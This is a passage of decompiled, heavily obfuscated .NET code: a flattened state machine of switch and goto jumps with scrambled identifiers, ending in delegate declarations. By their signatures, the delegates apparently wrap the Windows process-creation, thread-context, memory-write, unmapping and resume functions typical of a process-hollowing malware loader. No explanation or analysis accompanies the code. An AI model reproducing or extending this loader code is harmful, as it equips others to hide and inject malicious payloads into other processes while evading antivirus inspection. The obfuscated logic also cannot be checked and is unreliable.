              goto label_107;
            case 13:
              num11 = 0;
              goto label_85;
            case 14:
              num13 = 5;
              goto label_103;
            case 15:
              num11 = 17;
              goto label_85;
            case 16:
              num14 = num2;
              goto label_66;
            case 18:
              num15 = 25;
              goto label_45;
            case 20:
              num12 = num1;
              goto label_107;
            case 21:
              num4 = 7;
              checked { ++num6; }
              num3 = num6 <= 64 ? 18 : 43;
              continue;
            case 22:
              \u0001.Ⴗ(794, 815);
              num1 = -2;
              num5 = 2;
              num3 = 30;
              continue;
            case 23:
              num5 = 7;
              num3 = 30;
              continue;
            case 24:
              num11 = 11;
              goto label_85;
            case 25:
              num11 = 11;
              goto label_85;
            case 26:
              num4 = 11;
              num3 = !flag ? 54 : 2;
              continue;
            case 27:
              num11 = 18;
              goto label_85;
            case 28:
              goto label_101;
            case 29:
              num9 = 4;
              goto label_53;
            case 30:
              int num18;
              switch (num5)
              {
                case 0:
                  num18 = 47;
                  break;
                case 1:
                  num18 = 42;
                  break;
                case 2:
                  num18 = 39;
                  break;
                case 3:
                  num18 = 28;
                  break;
                case 4:
                  num18 = 56;
                  break;
                case 5:
                  num18 = 12;
                  break;
                case 6:
                  num18 = 22;
                  break;
                case 7:
                  num18 = 7;
                  break;
                case 8:
                  num18 = 26;
                  break;
                case 9:
                  num18 = 0;
                  break;
                case 10:
                  num18 = 10;
                  break;
                case 11:
                  num18 = 17;
                  break;
                case 12:
                  num18 = 34;
                  break;
                case 13:
                  num18 = 22;
                  break;
                case 14:
                  num18 = 37;
                  break;
                case 15:
                  num18 = 55;
                  break;
                case 16:
                  num18 = 4;
                  break;
                case 17:
                  num18 = 32;
                  break;
                case 18:
                  num18 = 21;
                  break;
                case 19:
                  num18 = 20;
                  break;
                case 20:
                  num18 = 16;
                  break;
                case 21:
                  num18 = 11;
                  break;
                case 22:
                  num18 = 50;
                  break;
                case 23:
                  num18 = 45;
                  break;
                case 24:
                  num18 = 42;
                  break;
                case 25:
                  num18 = 31;
                  break;
                default:
                  num18 = 22;
                  break;
              }
              num3 = num18;
              continue;
            case 31:
              num4 = 5;
              num7 = 3L;
              num5 = 15;
              num3 = 30;
              continue;
            case 32:
              num4 = 4;
              num6 = 9;
              num5 = 25;
              num3 = 30;
              continue;
            case 33:
              num16 = 15;
              break;
            case 34:
              num4 = 3;
              num5 = 17;
              num3 = 30;
              continue;
            case 35:
              num11 = 12;
              goto label_85;
            case 36:
              num13 = 19;
              goto label_103;
            case 37:
              num4 = 9;
              limit = 39M;
              num8 = 7M;
              num3 = 41;
              continue;
            case 38:
              checked { ++num7; }
              num3 = num7 <= 111L ? 33 : 60;
              continue;
            case 39:
              num4 = 2;
              Ⴐ.Ⴅ.Ⴗ();
              num5 = 12;
              num3 = 30;
              continue;
            case 40:
              num17 = 16;
              goto label_113;
            case 41:
              num5 = 10;
              num3 = 30;
              continue;
            case 42:
              num5 = 23;
              num3 = 30;
              continue;
            case 43:
              num15 = 0;
              goto label_45;
            case 44:
              num11 = 2;
              goto label_85;
            case 45:
              num4 = 13;
              num3 = 11;
              continue;
            case 46:
              num11 = 15;
              goto label_85;
            case 47:
              num4 = 8;
              flag = true;
              num5 = 14;
              num3 = 30;
              continue;
            case 48:
            case 54:
              num10 = 1;
              goto label_57;
            case 49:
              num17 = 22;
              goto label_113;
            case 50:
              num14 = num2 + 1;
              goto label_66;
            case 51:
              num11 = 23;
              goto label_85;
            case 52:
              num11 = 9;
              goto label_85;
            case 53:
              num17 = 16;
              goto label_113;
            case 55:
              num4 = 6;
              goto case 38;
            case 56:
              num4 = 10;
              num8 = \u0001.Ⴀ(num8, 1M, 900, 956);
              num5 = 10;
              num3 = 30;
              continue;
            case 58:
              num11 = 4;
              goto label_85;
            case 59:
              num11 = 8;
              goto label_85;
            case 60:
              num16 = 18;
              break;
            default:
              num5 = 13;
              num3 = 30;
              continue;
          }
          num5 = num16;
          num3 = 30;
          continue;
label_45:
          num5 = num15;
          num3 = 30;
          continue;
label_53:
          num5 = num9;
          num3 = 30;
          continue;
label_57:
          num5 = num10;
          num3 = 30;
          continue;
label_66:
          num2 = 0;
          int num19;
          switch (num14)
          {
            case 0:
              num19 = 25;
              break;
            case 1:
              goto label_1;
            case 2:
              num19 = 44;
              break;
            case 3:
              num19 = 35;
              break;
            case 4:
              num19 = 15;
              break;
            case 5:
              num19 = 6;
              break;
            case 6:
              num19 = 46;
              break;
            case 7:
              num19 = 27;
              break;
            case 8:
              num19 = 13;
              break;
            case 9:
              num19 = 8;
              break;
            case 10:
              num19 = 58;
              break;
            case 11:
              num19 = 59;
              break;
            case 12:
              num19 = 5;
              break;
            case 13:
              num19 = 51;
              break;
            case 14:
              num19 = 52;
              break;
            case 15:
              num19 = 3;
              break;
            default:
              num19 = 24;
              break;
          }
          num3 = num19;
          continue;
label_85:
          num5 = num11;
          num3 = 30;
          continue;
label_103:
          num5 = num13;
          num3 = 30;
          continue;
label_107:
          int num20;
          switch (num12)
          {
            case 0:
              num20 = 40;
              break;
            case 1:
              num20 = 49;
              break;
            default:
              num20 = 53;
              break;
          }
          num3 = num20;
          continue;
label_113:
          num5 = num17;
          num3 = 30;
        }
label_101:
        num2 = num4;
        num3 = num1 > -2 ? 36 : 14;
        goto label_2;
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        Ⴓ.Ⴓ(ex, 815, 855);
        goto label_101;
      }
label_119:
      int num21 = 6;
label_120:
      while (true)
      {
        int num22;
        int num23;
        switch (num21)
        {
          case 1:
          case 4:
            goto label_132;
          case 3:
            goto label_133;
          case 5:
            num23 = 2;
            break;
          case 7:
            num23 = 4;
            break;
          case 8:
          case 9:
            goto label_137;
          case 10:
            int num24;
            switch (num22)
            {
              case 0:
                num24 = 4;
                break;
              case 1:
                num24 = 4;
                break;
              case 2:
                num24 = 8;
                break;
              case 3:
                num24 = 11;
                break;
              case 4:
                num24 = 11;
                break;
              case 5:
                num24 = 3;
                break;
              case 6:
                num24 = 11;
                break;
              default:
                num24 = 4;
                break;
            }
            num21 = num24;
            continue;
          case 11:
            goto label_116;
          default:
            num22 = 1;
            num21 = 10;
            continue;
        }
        num22 = num23;
        num21 = 10;
      }
label_116:
      return;
label_132:
      throw Ⴓ.Ⴃ.Ⴀ.Ⴍ(-2146828237, 495, 397);
label_137:
      ProjectData.ClearProjectError();
      return;
label_133:
      num21 = num2 == 0 ? 7 : 5;
      goto label_120;
    }

    public delegate bool ႰႣ(
      string ႷႣ,
      string ႷႷ,
      IntPtr ႷႨ,
      IntPtr ႷႳ,
      bool ႷႰ,
      int ႷႥ,
      IntPtr ႷႭ,
      string ႷႤ,
      byte[] ႷႠ,
      IntPtr[] ႷႼ);

    public delegate bool ႰႠ(IntPtr Ⴀ, uint[] Ⴈ);

    public delegate bool ႰႼ(IntPtr Ⴄ, IntPtr Ⴍ, ref IntPtr Ⴃ, IntPtr Ⴀ, ref IntPtr Ⴜ);

    public delegate uint ႳႤ(IntPtr Ⴀ, IntPtr Ⴓ);

    public delegate IntPtr ႳႰ(IntPtr Ⴈ, IntPtr Ⴀ, IntPtr Ⴐ, int Ⴄ, int Ⴜ);

    public delegate bool ႳႳ(IntPtr Ⴈ, IntPtr Ⴗ, byte[] Ⴐ, IntPtr Ⴓ, ref IntPtr Ⴜ);

    public delegate int ႳႥ(IntPtr Ⴗ);
  }
}
